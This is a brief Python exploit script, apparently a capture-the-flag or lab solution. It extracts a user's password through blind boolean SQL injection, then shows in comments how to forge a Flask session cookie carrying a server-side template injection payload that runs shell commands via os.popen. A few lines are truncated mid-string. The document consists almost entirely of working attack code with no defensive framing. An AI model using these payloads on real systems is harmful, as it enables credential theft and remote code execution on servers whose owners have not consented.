import requests

url = '[instance-url]'
password = ""

characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&()*+,-./:<=>?@[]_{|}~'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

for index in range(0, 23):
    found = False
    for char in characters:
        payload = f"1%3d1 and (SELECT substr(password,{index+1},1) FROM users limit 1 offset 1) %3d char({ord(char)}) a>        # print(payload)
        response = requests.post(url, data=payload, allow_redirects=False, verify=False, headers=headers)
        print(f"Trying: {char} ,Password so far: {password}{'_' * (23 - len(password))}", end='\r', flush=True)  # Disp>        # print(response.status_code)
        if response.status_code == 302:
            password += char
            break

print(f"\nPassword : {password}", flush=True)


# Use previous password to craft SSTI payload in cookie

# flask-unsign --sign --cookie "{'type': '{{  self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.cmd).read() }}'}" --secret 'ILIKEpotatoesSOMUCH::&&' --legacy


# RCE

# GET /panel?cmd=id